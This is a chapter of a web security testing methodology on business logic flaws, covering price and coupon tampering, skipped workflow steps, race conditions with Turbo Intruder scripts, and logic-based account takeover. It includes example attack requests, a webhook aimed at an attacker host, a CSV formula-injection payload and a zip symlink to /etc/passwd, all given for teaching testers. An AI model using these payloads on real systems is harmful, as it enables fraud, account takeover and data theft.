---
title: "Part 6: Business Logic & Race Conditions"
nav_order: 7
layout: default
---

### 6.1 What Business Logic Flaws Are

A business logic flaw exists when an application enforces security through rules
("you can only buy 1 of this", "discount codes expire after one use",
"you must verify your email before accessing this") but those rules can be
circumvented through normal application functionality — without any injection,
without any encoding trick, often just by doing things in the wrong order,
the wrong quantity, or from the wrong account.

**Why scanners cannot find them:**
```
A scanner sees: POST /checkout {"quantity": -1, "price": 9.99}
A scanner thinks: valid HTTP request, 200 response, nothing wrong

A human thinks: negative quantity means the application owes ME money.
               Did the total become negative? Did it charge the card negatively?
               Did it add credit to my account?
```

**The mental model for finding them:**
```
For every feature the application has, ask:
1. What assumption does this feature make about user behavior?
2. What happens if I violate that assumption?
3. What is the worst outcome if the assumption is wrong?

Examples of assumptions to violate:
- "Users will enter positive quantities"        → try 0, -1, 0.001
- "Users will complete steps in order"          → skip step 2
- "Discount codes are used once"                → use twice, concurrently
- "Users won't modify price fields"             → tamper the price
- "Account A can't access Account B's data"     → IDOR (Part 3)
- "Free trial ends after 30 days"               → extend, re-register, bypass
```

---

### 6.2 Price & Payment Manipulation

---

#### 6.2.1 Negative Quantity and Price Tampering

🔍 **What to do:**
Any field that represents a numeric value the application uses in calculations
is a potential manipulation point. Intercept the request and modify the value.

```bash
# Standard checkout request:
POST /api/checkout
{"items": [{"product_id": "abc", "quantity": 1, "price": 99.99}]}

# Test negative quantity:
{"items": [{"product_id": "abc", "quantity": -1, "price": 99.99}]}
# Expected: error. Vulnerable: total becomes -99.99, credit issued, or order placed free

# Test zero quantity:
{"items": [{"product_id": "abc", "quantity": 0, "price": 99.99}]}
# Expected: error. Vulnerable: order placed with $0 total

# Test fractional quantity (if API accepts):
{"items": [{"product_id": "abc", "quantity": 0.001, "price": 99.99}]}
# May result in $0.10 charge for a $99.99 item

# Direct price tampering:
{"items": [{"product_id": "abc", "quantity": 1, "price": 0.01}]}
{"items": [{"product_id": "abc", "quantity": 1, "price": -99.99}]}
# Expected: server ignores client price. Vulnerable: server trusts client price

# Integer overflow (large values):
{"items": [{"product_id": "abc", "quantity": 2147483648, "price": 99.99}]}
# 32-bit signed integer max + 1 → wraps to negative
```

**What to observe:**
```
- Does the total in the response change? (server is trusting client value)
- Is an order placed? (checkout completed with manipulated amount)
- Is a refund/credit issued? (negative total processed as credit)
- Does the app error? (error reveals backend logic, potential info disclosure)
```

---

#### 6.2.2 Currency Confusion

🔍 **What to do:**
Applications that support multiple currencies sometimes fail to enforce
that the currency used at pricing time matches the currency used at payment time.

```bash
# Test: view product price in USD, switch currency to one with lower value at payment
# Example: product costs $100 USD
# Switch currency parameter to KES (Kenyan Shilling) at checkout:
POST /api/checkout
{"amount": 100, "currency": "KES"}
# If server processes 100 KES (~$0.77) instead of $100 → currency confusion

# Also test:
# - Remove currency field entirely → does app default to cheapest?
# - Use invalid currency code → does app crash with useful error?
# - Switch currency between cart and payment steps
{"currency": "USD"}  →  switch to →  {"currency": "BTC"}  (different valuation)
```

---

#### 6.2.3 Coupon and Discount Stacking

🔍 **Tests to run on every coupon/discount system:**

```bash
# 1. Apply the same coupon twice:
POST /api/cart/coupon {"code": "SAVE20"}  # first application
POST /api/cart/coupon {"code": "SAVE20"}  # second application
# Does the discount stack? ($20 off twice = $40 off?)

# 2. Race condition — apply concurrently (see 6.4):
# Send two simultaneous requests applying the same one-time coupon
# Both may succeed if the uniqueness check isn't atomic

# 3. Stack multiple different coupons:
POST /api/cart/coupon {"code": "SAVE20"}
POST /api/cart/coupon {"code": "FREESHIP"}
POST /api/cart/coupon {"code": "EXTRA10"}
# Are there limits on stacking? Can you combine to get 100%+ discount?

# 4. Apply expired coupon:
POST /api/cart/coupon {"code": "EXPIRED2024"}
# Does server validate expiry? Or just check if code exists?

# 5. Reuse a coupon after order cancellation:
# Apply coupon → place order → cancel order → try coupon again
# Should be invalidated. Often isn't.

# 6. Apply coupon for wrong product category:
# Coupon for "electronics only" — apply to non-electronics
# Does the server validate the restriction?
```

---

#### 6.2.4 Free Trial and Subscription Bypass

🔍 **Tests:**
```bash
# 1. Re-register with same email after trial expires:
# Use: plus-addressing trick: user+1@gmail.com, user+2@gmail.com
# Some apps treat these as different emails but they go to same inbox

# 2. Reactivate expired subscription by manipulating dates:
PUT /api/subscription {"trial_end": "2030-12-31", "status": "active"}
# Does server trust client-supplied dates?

# 3. Access premium features after trial expires:
# Complete trial → let it expire → directly access /api/premium/features
# Check if server re-validates subscription on every request

# 4. Downgrade but retain premium features:
# Downgrade plan → check if premium features are still accessible
# Frontend may hide them but backend may not enforce

# 5. Bypass payment wall via direct API access:
# Register → skip payment step → access /api/dashboard directly
# Same forced browsing technique as 3.3.3 — applies to subscription gates too

# 6. Plan parameter tampering:
POST /api/users/register {"email": "x@x.com", "plan": "enterprise"}
# Does server validate plan at registration or trust client value?
```

---

### 6.3 Workflow and State Bypass

---

#### 6.3.1 Multi-Step Process Skip

🔍 **What to do:**
Any multi-step process is a candidate. Map every step, then attempt to skip
or reorder them. The server should validate preconditions on every step —
most don't.

**Common multi-step processes to test:**
```
E-commerce checkout:
Step 1: Add to cart
Step 2: Enter shipping address
Step 3: Enter payment details
Step 4: Confirm order

Attack: Skip step 3 (payment) → go directly to step 4
Does the app place a free order?

Account verification:
Step 1: Register
Step 2: Verify email (click link)
Step 3: Access account

Attack: Skip step 2 → access account directly
Does the app require verified email for every authenticated action?

KYC / identity verification:
Step 1: Submit ID documents
Step 2: Admin approval
Step 3: Access financial features

Attack: Skip step 2 → try accessing financial features
Is step 2 enforced server-side or just hidden in the UI?

Password change flow:
Step 1: Enter current password
Step 2: Enter new password

Attack: Skip step 1 (current password check)
Is current password verified server-side before allowing change?
```

**Testing approach:**
```bash
# Map all steps by browsing normally with Burp running
# Identify state tokens, step indicators, session variables
# Attempt requests for later steps with early-step session state

# Check for step indicators in requests:
{"step": 2, "data": {...}}  →  try sending {"step": 4, "data": {...}}
GET /checkout/step3  →  try directly: GET /checkout/step4 or GET /checkout/complete

# Check for server-side state enforcement:
# If step 2 requires a token from step 1 — is that token validated?
# If step 3 requires payment_intent_id — can you forge or reuse one?
```

---

#### 6.3.2 Status Parameter Manipulation

🔍 **What to do:**
Applications often store the status of an object (order, ticket, account,
document) and restrict actions based on that status. If the status is
writable by the user, or derived from a client parameter, it can be manipulated.

```bash
# Order status manipulation:
PUT /api/orders/1042 {"status": "shipped"}  # user tries to mark own order shipped
PUT /api/orders/1042 {"status": "refunded"} # user tries to get refund
PUT /api/orders/1042 {"status": "completed"}# user tries to bypass pending state

# Account status:
PATCH /api/users/me {"verified": true}      # self-verify without email confirmation
PATCH /api/users/me {"is_premium": true}    # self-upgrade to premium
PATCH /api/users/me {"kyc_status": "approved"} # self-approve KYC

# Ticket/task status:
PUT /api/tickets/55 {"status": "closed"}    # close ticket before resolution
PUT /api/tasks/88 {"status": "approved"}    # self-approve task

# The pattern: find any status field in PUT/PATCH requests
# Try setting it to every other valid status value
# Look for: privilege escalation, financial gain, bypassed verification
```

---

#### 6.3.3 Forced Browsing to Restricted Steps

→ Covered in [3.3.3](#333-forced-browsing-and-state-bypass). The same technique
applies to business logic: navigate directly to later steps in a workflow
without completing prerequisite steps. Focus here on the *business consequence*:
free orders, bypassed KYC, unverified accounts with full access.

---

### 6.4 Race Conditions

**What it is:**
When two or more requests are processed concurrently and share a resource,
the application may process both before either has completed the state change
that would prevent the second. A one-time coupon applied twice simultaneously.
A $100 withdrawal processed twice from a $100 balance.

---

#### 6.4.1 What to Look For

🔍 **High-value race condition targets:**
```
One-time coupons / promo codes        → apply twice simultaneously
Gift card / voucher redemption        → redeem twice simultaneously
Referral bonuses                      → trigger twice
File operations                       → read-then-write TOCTOU
Password reset token use              → use token twice simultaneously
Email change confirmation links       → click same link twice
Transfer / payment operations         → double-spend
Like / vote limits                    → vote twice simultaneously
Rate-limited actions                  → bypass limit via concurrent requests
Account deletion + data export        → export during deletion window
```

**The key question:** *Does the application check a condition and then act on it,
with a gap between the check and the action where another request could interfere?*

---

#### 6.4.2 Turbo Intruder — Race Condition Technique

🔍 **The standard tool for race conditions in Burp:**

```python
# Turbo Intruder script for race condition testing:
# Right-click request in Burp → Extensions → Turbo Intruder → Send to Turbo Intruder

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,   # high concurrency
        requestsPerConnection=1,
        pipeline=False
    )
    # Queue the same request 20 times simultaneously:
    for i in range(20):
        engine.queue(target.req)

def handleResponse(req, interesting):
    # Look for responses that indicate success:
    if req.status == 200 and 'success' in req.response:
        table.add(req)
    # Or look for the response that should only appear once:
    if 'coupon applied' in req.response.lower():
        table.add(req)
```

**What to look for in results:**
```
Race condition confirmed:
- Multiple 200 responses where only one should succeed
- Balance credited/decremented multiple times
- Coupon applied discount appears in multiple responses
- Rate limit counter not incremented correctly (all requests succeed)

No race condition:
- Only first request succeeds, rest return 400/409/error
- "Already used" / "Insufficient balance" on concurrent requests
```

---

#### 6.4.3 HTTP/2 Single-Packet Attack

🔍 **The most reliable race condition technique (2023+):**
HTTP/2 multiplexes multiple requests over a single TCP connection.
By sending multiple requests in a single packet, they arrive at the server
simultaneously — eliminating network jitter that causes false negatives
in HTTP/1.1 race testing.

```
In Burp Suite (version 2022.9+):
1. Send target request to Repeater
2. In Repeater: change protocol to HTTP/2
3. Right-click → "Send group in parallel (single-packet attack)"
   (Add multiple tabs with the same request first)
4. All requests in the group are sent in one TCP packet
5. Server receives and processes them truly simultaneously

This eliminates the timing window that causes race conditions to be missed.
Always prefer single-packet attack over Turbo Intruder for HTTP/2 targets.
```

**For HTTP/1.1 targets (last-byte sync technique):**
```python
# Turbo Intruder with gate (holds last byte until all connections ready):
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,
        requestsPerConnection=1,
        pipeline=False
    )
    for i in range(20):
        engine.queue(target.req, gate='race')
    engine.openGate('race')  # release all requests simultaneously
```

---

#### 6.4.4 Race Condition PoC and Reporting

✅ **PoC structure:**
```
1. Set up the precondition (e.g., load a one-time coupon, set account balance)
2. Send N concurrent requests (show Turbo Intruder / single-packet attack config)
3. Show multiple success responses (screenshot)
4. Show the result: balance credited twice, coupon applied twice, etc.
5. State the financial impact: "An attacker could repeatedly apply a $50 coupon
   to reduce the total price to $0 or negative by sending ~10 concurrent requests"
```

**Impact framing:**
```
Coupon reuse:         "Arbitrary discount, potential $0 purchases"
Double-spend:         "Financial loss to platform — exact amount depends on limits"
Referral abuse:       "Infinite referral credit generation"
Rate limit bypass:    "Brute-force of OTP/token protected by rate limit"
Vote/like abuse:      "Manipulation of ranking/reputation systems"
```

📚 **References:**
- [PortSwigger — Race conditions](https://portswigger.net/web-security/race-conditions)
- [James Kettle — Smashing the state machine (DEF CON 31)](https://portswigger.net/research/smashing-the-state-machine)

---

### 6.5 Account and Ownership Logic

---

#### 6.5.1 Account Takeover via Logic (No Auth Vuln Needed)

🔍 **These are logic-based ATOs — no JWT exploit, no SQL injection:**

**Email change without re-authentication:**
```bash
# If changing email requires no current password verification:
PUT /api/users/me {"email": "attacker@evil.com"}
# Change email → trigger password reset → ATO

# Combined with IDOR (Part 3):
PUT /api/users/1043 {"email": "attacker@evil.com"}  # change victim's email
```

**Email change with pending verification — account merge:**
```
1. Account A exists: victim@gmail.com
2. Attacker changes their email to victim@gmail.com (pending verification)
3. Victim registers/logs in via OAuth using victim@gmail.com
4. Does the app merge accounts? Does it link OAuth to attacker's account?
   (Same pattern as 2.4.4 — worth testing in both directions)
```

**Password reset with predictable identifier:**
```bash
# If reset is based on: username, user_id, or email with no token:
POST /api/reset {"user_id": 1043, "new_password": "hacked123"}
# No token required → ATO for any known user_id
```

**Support / admin override without verification:**
```bash
# "I can't log in" flows that bypass normal auth:
POST /api/support/reset-account {"email": "victim@target.com", "reason": "locked out"}
# Does support flow require any verification before resetting?
# Test: does it send to the email, or does it just reset and return new creds?
```

---

#### 6.5.2 Email Confirmation Bypass

🔍 **Tests:**
```bash
# 1. Access features before confirming email:
Register → skip email confirmation → navigate to /dashboard, /api/profile
Does app enforce email verification on all sensitive actions?

# 2. Confirm a different email than registered:
Register with victim@gmail.com
Receive confirmation link for your own email: /confirm?token=abc&email=your@email.com
Modify email parameter: /confirm?token=abc&email=victim@gmail.com
Does app confirm the modified email or the token's email?

# 3. Token not bound to email:
Generate token for email A
Change email to email B
Use token → does it confirm email B?

# 4. Confirmation link reuse:
Click confirmation link once (confirmed)
Click same link again → does it re-confirm? Does anything happen?

# 5. Confirmation link for someone else:
If confirmation links are sequential or predictable (e.g., /confirm?id=12345)
→ Confirm someone else's email by guessing their token ID
```

---

#### 6.5.3 Inviting Yourself and Organization Logic

🔍 **Tests for multi-tenant / organization features:**
```bash
# 1. Invite yourself to a higher-privileged role:
POST /api/orgs/target-org/invite {"email": "attacker@evil.com", "role": "admin"}
# Invite accepted → admin in victim's org

# 2. Join org without invite:
POST /api/orgs/target-org/join
# Does the org require invite tokens? Or is joining open?

# 3. Invite token reuse:
Use org invite link once → try using same link again from different account
→ Can multiple people join with one invite?

# 4. Role escalation via re-invite:
You're a "member" in org → get re-invited as "admin" by manipulating the invite
# Or: accept invite with role parameter tampered: {"role": "admin"}

# 5. Cross-org data access:
Member of org A → try accessing org B's resources via IDOR
GET /api/orgs/orgB/members
GET /api/orgs/orgB/projects

# 6. Leave org + retain access:
Join org → gain access → leave org → check if access persists
(Session/token not invalidated after org membership change)
```

---

### 6.6 Feature Abuse with Security Impact

---

#### 6.6.1 File Operation Logic

🔍 **Tests for apps with file management:**
```bash
# 1. Overwrite other users' files via filename collision:
# User A uploads: report.pdf
# User B uploads: report.pdf
# Does user B's upload overwrite user A's file?
# Especially dangerous if filenames are user-controlled and not namespaced

# 2. Delete other users' files:
DELETE /api/files/5523   # IDOR — does ID belong to another user?

# 3. File path traversal in upload destination:
# Filename: ../../config/evil.php (path traversal via filename)
# Does the app sanitize filenames before writing to disk?

# 4. Symlink attack (on some platforms):
# Upload a zip containing a symlink to /etc/passwd
# When extracted server-side, follows symlink → reads sensitive file

# 5. Storage quota bypass:
# Upload large files repeatedly → exhaust another user's storage quota
# Or: does negative file size bypass quota check?

# 6. Shared storage namespace:
# Are uploaded files accessible without authentication?
# Can you enumerate other users' files by guessing filename patterns?
GET /uploads/user_1043_profile.jpg  # predictable filename → info disclosure
```

---

#### 6.6.2 Import/Export Data Exposure

🔍 **Tests:**
```bash
# 1. Export another user's data via IDOR:
GET /api/export?user_id=1043&format=csv
# → IDOR variant — covered in Part 3 but worth re-testing in export context
# Export responses often contain more data than normal API responses

# 2. Export triggers include sensitive fields not in UI:
# Request export of your own data
# Compare exported CSV/JSON fields to what the UI shows
# Exports often include: hashed passwords, internal IDs, admin notes,
#   2FA secrets, IP logs, linked accounts

# 3. Import overwriting existing data:
# Import a CSV with IDs matching other users' records
# Does the import update records that belong to other users?
POST /api/import {"data": [{"id": 1043, "email": "attacker@evil.com"}]}

# 4. Import triggering server-side processing:
# CSV import processed by a parser that supports formulas?
# → CSV injection: ="=cmd|' /C calc'!A0" in a field
# When opened in Excel by an admin → code executes (impact is on admin's machine)

# 5. Backup export contains more than expected:
# "Export my account data" → does it include other users' data accidentally?
# Race condition: export during bulk operation that includes other users' records
```

---

#### 6.6.3 Notification and Webhook Logic for Info Leakage

🔍 **Tests:**
```bash
# 1. Webhook URL receives other users' data:
POST /api/settings/webhook {"url": "https://attacker.com/hook"}
# Does the webhook fire for YOUR events only, or also for org/global events?
# Check: does it include other users' data in the payload?

# 2. Email notification manipulation:
# Change notification email to victim's address
# Trigger notifications → victim receives your notifications
# Or: CC/BCC field injection in notification settings

# 3. Notification for other users' actions:
# Subscribe to notifications for resource you don't own
# IDOR in notification subscription: POST /api/notify {"resource_id": 1043}
# When resource 1043 is updated → you get notified (data leakage)

# 4. Webhook receives sensitive data in plaintext:
# Set up webhook, trigger various actions
# Does webhook payload include: tokens, passwords, PII, internal IDs?
# Many webhook implementations leak more than intended in the payload

# 5. Trigger other users' notifications:
POST /api/notify/send {"user_id": 1043, "message": "Custom message"}
# Can you send arbitrary notifications to other users? (harassment/phishing vector)
```

---

### Part 6 — Complete Business Logic Testing Checklist

```
PRICE & PAYMENT
□ Negative quantity in checkout request
□ Zero quantity — does order process for free?
□ Direct price field tampering (client-supplied price trusted?)
□ Integer overflow on quantity (2147483648)
□ Currency parameter manipulation
□ Same coupon applied twice (sequential and concurrent)
□ Multiple different coupons stacked
□ Coupon for wrong product category
□ Expired coupon accepted?
□ Coupon valid after order cancellation?
□ Free trial re-registration via email variation
□ Subscription status field tampered via PATCH

WORKFLOW & STATE
□ Every multi-step flow: skip step 2, skip to final step
□ Checkout without payment step
□ Account features accessible without email verification
□ Status field in PUT/PATCH: try all valid status values
□ Step indicators in requests: tamper step number
□ KYC / verification gates: directly access restricted features

RACE CONDITIONS
□ One-time coupons/codes: concurrent application
□ Gift card/voucher: concurrent redemption
□ Payments/transfers: double-spend attempt
□ Rate-limited actions: concurrent bypass
□ HTTP/2 single-packet attack for all of the above
□ Last-byte sync (Turbo Intruder gate) for HTTP/1.1 targets

ACCOUNT LOGIC
□ Email change without current password → trigger reset → ATO
□ Email change to victim's email (pending state) → account merge
□ Password reset without token (user_id/email only)
□ Email confirmation token: bound to email? Reusable? Predictable?
□ Confirm different email than token was issued for
□ Support/recovery flows: bypass verification?

ORGANIZATION LOGIC
□ Invite yourself with admin role
□ Join org without invite
□ Invite token reuse (multiple joiners)
□ Leave org → retain access?
□ Cross-org resource access via IDOR

FILE OPERATIONS
□ Filename collision → overwrite other users' files
□ Delete other users' files via IDOR
□ Filename path traversal (../../ in filename)
□ Zip symlink attack
□ Uploaded files publicly accessible without auth?

IMPORT/EXPORT
□ Export contains more fields than UI shows
□ Export other user's data via IDOR
□ Import overwrites other users' records via ID collision
□ CSV injection in import fields (admin opens in Excel)
□ Export during race window includes other users' data

NOTIFICATIONS & WEBHOOKS
□ Webhook receives other users' data
□ Webhook payload leaks sensitive fields
□ Subscribe to notifications for resources you don't own
□ Send notifications to other users (harassment vector)
```

📚 **Part 6 References:**
- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger — Race conditions](https://portswigger.net/web-security/race-conditions)
- [James Kettle — Smashing the state machine](https://portswigger.net/research/smashing-the-state-machine)
- [OWASP — Business Logic Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html)
- [HackTricks — Business Logic](https://book.hacktricks.xyz/pentesting-web/business-logic-vulnerabilities)

---

